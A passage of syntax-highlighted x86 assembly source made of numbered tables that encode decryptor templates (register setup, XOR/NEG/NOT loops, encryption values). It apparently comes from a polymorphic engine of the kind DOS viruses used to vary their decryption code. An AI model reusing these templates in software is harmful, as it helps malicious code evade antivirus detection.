        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,[reg7+offset]        (5)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; MOV [reg7+offset],reg2        (6)</span><span class="sc0">
        </span><span class="sc1">; INC reg7                      (C)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">13h</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routine8</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">71h</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; NEG [reg7+offset]             (A)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,[reg7+offset]        (5)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; MOV [reg7+offset],reg2        (6)</span><span class="sc0">
        </span><span class="sc1">; DEC reg0                      (03)</span><span class="sc0">
        </span><span class="sc1">; ADD reg7,1                    (04)</span><span class="sc0">
        </span><span class="sc1">; SUB reg1,1                    (05)</span><span class="sc0">
        </span><span class="sc1">; DEC reg0                      (03)</span><span class="sc0">
        </span><span class="sc1">; SUB reg1,1                    (05)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">0EEh</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0ADh</span><span class="sc4">,</span><span class="sc2">5Fh</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routine1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">42h</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg0,[reg7+offset]       (01)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; MOV [reg7+offset],reg2        (6)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,reg1                 (8)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,reg1                 (8)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; DEC reg0                      (03)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,reg0                 (0E)</span><span class="sc0">
        </span><span class="sc1">; ADD reg7,1                    (04)</span><span class="sc0">
        </span><span class="sc1">; AND reg1,reg1                 (0F)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc1">; return code 0                 (0)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">0CEh</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">0C2h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routineC</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">33h</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; NOT [reg7+offset]             (B)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,[reg7+offset]        (5)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; MOV [reg7+offset],reg2        (6)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; INC reg7                      (C)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">14h</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc4">,</span><span class="sc2">0EEh</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0DBh</span><span class="sc4">,</span><span class="sc2">5Fh</span><span class="sc4">,</span><span class="sc2">6Fh</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routineE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">64h</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; XOR [reg7],reg0               (9)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,reg1                 (8)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; ADD reg7,1                    (04)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,reg0                 (0E)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; AND reg1,reg1                 (0F)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">41h</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc4">,</span><span class="sc2">9h</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routine2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">5h</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,encryption value     (7)</span><span class="sc0">
        </span><span class="sc1">; PUSH reg0                     (0A)</span><span class="sc0">
        </span><span class="sc1">; PUSH [reg7+offset]            (08)</span><span class="sc0">
        </span><span class="sc1">; POP reg0                      (0B)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; POP reg0                      (0B)</span><span class="sc0">
        </span><span class="sc1">; PUSH reg0                     (0A)</span><span class="sc0">
        </span><span class="sc1">; SUB reg2,reg0                 (07)</span><span class="sc0">
        </span><span class="sc1">; MOV [reg7+offset],reg2        (6)</span><span class="sc0">
        </span><span class="sc1">; INC reg7                      (C)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,reg1                 (8)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,reg1                 (8)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,reg0                 (0E)</span><span class="sc0">
        </span><span class="sc1">; POP reg0                      (0B)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; AND reg1,reg1                 (0F)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">13h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routineF</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">56h</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,[reg7+offset]        (5)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; ADD reg2,reg0                 (06)</span><span class="sc0">
        </span><span class="sc1">; MOV [reg7+offset],reg2        (6)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,reg1                 (8)</span><span class="sc0">
        </span><span class="sc1">; DEC reg0                      (03)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; INC reg7                      (C)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc4">,</span><span class="sc2">0DCh</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routine9</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">27h</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; XOR [reg7],reg0               (9)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; ADD reg7,1                    (04)</span><span class="sc0">
        </span><span class="sc1">; PUSH reg0                     (0A)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,reg1                 (8)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,reg0                 (0E)</span><span class="sc0">
        </span><span class="sc1">; POP reg0                      (0B)</span><span class="sc0">
        </span><span class="sc1">; DEC reg0                      (03)</span><span class="sc0">
        </span><span class="sc1">; AND reg1,reg1                 (0F)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">41h</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc4">,</span><span class="sc2">9h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">0A8h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routine7</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">32h</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,reg1                 (8)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; POP reg0                      (0B)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; MOV [reg7+offset],reg2        (6)</span><span class="sc0">
        </span><span class="sc1">; DEC reg0                      (03)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; ADD reg7,1                    (04)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc1">; return code 0                 (0)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">41h</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">4Dh</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routine5</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">11h</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; NEG [reg7+offset]             (A)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,[reg7+offset]        (5)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; DEC reg0                      (03)</span><span class="sc0">
        </span><span class="sc1">; DEC reg0                      (03)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg0,[reg7+offset]       (01)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; ADD reg7,1                    (04)</span><span class="sc0">
        </span><span class="sc1">; AND reg1,reg1                 (0F)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">5Fh</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routineB</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; PUSH reg0                     (0A)</span><span class="sc0">
        </span><span class="sc1">; PUSH [reg7+offset]            (08)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,reg1                 (8)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,reg1                 (8)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,reg0                 (0E)</span><span class="sc0">
        </span><span class="sc1">; POP reg0                      (0B)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; POP reg0                      (0B)</span><span class="sc0">
        </span><span class="sc1">; ADD reg2,reg0                 (06)</span><span class="sc0">
        </span><span class="sc1">; PUSH reg0                     (0A)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; PUSH reg0                     (0A)</span><span class="sc0">
        </span><span class="sc1">; POP [reg7+offset]             (09)</span><span class="sc0">
        </span><span class="sc1">; POP reg0                      (0B)</span><span class="sc0">
        </span><span class="sc1">; DEC reg0                      (03)</span><span class="sc0">
        </span><span class="sc1">; INC reg7                      (C)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; AND reg1,reg1                 (0F)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">31h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routine3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">4h</span><span class="sc0">
